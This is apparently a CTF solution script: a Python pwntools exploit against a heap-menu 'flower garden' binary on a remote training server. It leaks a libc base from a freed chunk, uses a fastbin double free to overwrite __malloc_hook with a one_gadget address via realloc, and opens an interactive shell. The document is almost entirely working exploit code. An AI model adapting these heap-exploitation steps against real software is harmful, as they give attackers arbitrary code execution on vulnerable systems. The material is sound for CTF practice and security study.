from pwn import *
#p=process('./1')
#libc=ELF('/glibc/2.23/64/lib/libc-2.23.so')
p=remote('node3.buuoj.cn',26234)
libc=ELF('libc-2.23_64.so')
magic=0x0400C5E
context.terminal = ['tmux','splitw','-h']
def debug():
    gdb.attach(p)
    pause()
def add(len,name,color):
    p.recvuntil('Your choice : ')
    p.sendline('1')
    p.recvuntil('Length of the name :')
    p.sendline(str(len))
    p.recvuntil('The name of flower :')
    p.sendline(str(name))
    p.recvuntil('The color of the flower :')
    p.sendline(str(color))
def visit():
    p.recvuntil('Your choice : ')
    p.sendline('2')
def delete(idx):
    p.recvuntil('Your choice : ')
    p.sendline('3')
    p.recvuntil('Which flower do you want to remove from the garden:')
    p.sendline(str(idx))
def clean(idx):
    p.recvuntil('Your choice : ')
    p.sendline('4')
    
add(0x98,'a','a')
add(0x68,'a','a')
delete(0)
add(0x68,'a'*7,'a')
visit()
#libc.address=u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))-libc.sym['main_arena']-88
libc.address=u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))-0x3c4b20-88
print hex(libc.address)
add(0x68,'a','a')
delete(1)
delete(3)
delete(1)
add(0x68,p64(libc.sym['__malloc_hook']-0x23),p64(libc.sym['__malloc_hook']-0x23))
add(0x68,p64(libc.sym['__malloc_hook']-0x23),p64(libc.sym['__malloc_hook']-0x23))
add(0x68,p64(libc.sym['__malloc_hook']-0x23),p64(libc.sym['__malloc_hook']-0x23))
og=[0x45216,0x4526a,0xf02a4,0xf1147]
ogg=libc.address+og[1]
add(0x68,11*'a'+p64(ogg)+p64(libc.sym['realloc']+0x10),11*'a'+p64(ogg)+p64(libc.sym['realloc']+0x10))
sleep(1)
p.sendline('1')
p.interactive()
